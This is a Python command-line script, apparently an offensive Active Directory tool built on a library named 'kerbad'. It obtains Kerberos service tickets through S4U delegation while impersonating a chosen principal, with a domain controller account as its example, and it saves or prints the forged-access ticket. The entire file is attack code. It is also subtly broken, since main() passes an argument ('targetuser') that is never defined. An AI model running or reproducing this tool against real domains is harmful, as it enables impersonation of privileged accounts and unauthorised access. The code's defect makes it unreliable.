import logging
import kerbad

LOG = kerbad.getLogger()

import asyncio

from kerbad.common.factory import KerberosClientFactory, kerberos_url_help_epilog
from kerbad.common.constants import KerberosSecretType
from kerbad.common.spn import KerberosSPN
from kerbad.common.creds import KerberosCredential
from kerbad.common.kirbi import Kirbi


async def getS4U2proxy(kerberos_url, spn, targetuser, kirbifile = None, ccachefile = None):
	cu = KerberosClientFactory.from_url(kerberos_url)
	client = cu.get_client()
	service_spn = KerberosSPN.from_spn(spn)
	target_user = KerberosSPN.from_upn(targetuser)
	
	if not cu.secret_type.name.startswith(KerberosSecretType.CCACHE.name):
		LOG.debug('Getting TGT')
		await client.with_clock_skew(client.get_TGT)
		LOG.debug('Getting S4Uself')
		tgs, encTGSRepPart, key = await client.with_clock_skew(client.getST, target_user, service_spn)
	else:
		LOG.debug('Getting TGS via TGT from CCACHE')
		for kirbi in client.credential.ccache.get_all_tgt_kirbis():
			try:
				LOG.info('Trying to get SPN with %s' % kirbi.get_username())
				ccred_test = KerberosCredential.from_kirbi(kirbi.to_hex(), encoding='hex')
				client = cu.get_client_newcred(ccred_test)
				tgs, encTGSRepPart, key = await client.with_clock_skew(client.getST, target_user, service_spn)
				LOG.info('Sucsess!')
				break
			except Exception as e:

				LOG.debug('This ticket is not usable it seems Reason: %s' % e)
				continue
	
	if ccachefile is not None:
		client.ccache.to_file(ccachefile)
		print('Ticket stored in ccache file %s' % ccachefile)
	
	kirbi = Kirbi.from_ticketdata(tgs, encTGSRepPart)
	print(str(kirbi))
	if kirbifile is not None:
		kirbi.to_file(kirbifile)
		
	LOG.info('Done!')
def main():
	import argparse
	
	parser = argparse.ArgumentParser(description='Gets an S4U2proxy ticket impersonating given principal', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
	parser.add_argument('--kirbi', help='kirbi file to store the TGS ticket in, otherwise kirbi will be printed to stdout')
	parser.add_argument('--ccache', help='ccache file to store the TGT ticket in')
	parser.add_argument('-v', '--verbose', action='count', default=0)
	parser.add_argument('kerberos_url', help='Machine account credentials in kerberos URL format.')
	parser.add_argument('spn', help='the service principal in format <service>/<server-hostname>@<domain> Example: cifs/fileserver.test.corp@TEST.corp for a TGS ticket to be used for file access on server "fileserver". IMPORTANT: SERVER\'S HOSTNAME MUST BE USED, NOT IP!!!')
	parser.add_argument('impersonate', help='principal to impersonate, example: dc01$@TEST.corp')
	
	args = parser.parse_args()
	if args.verbose > 0:
		LOG.setLevel(logging.DEBUG)

	asyncio.run(getS4U2proxy(args.kerberos_url, args.spn, args.targetuser, args.kirbi, args.ccache))
	
	
if __name__ == '__main__':
	main()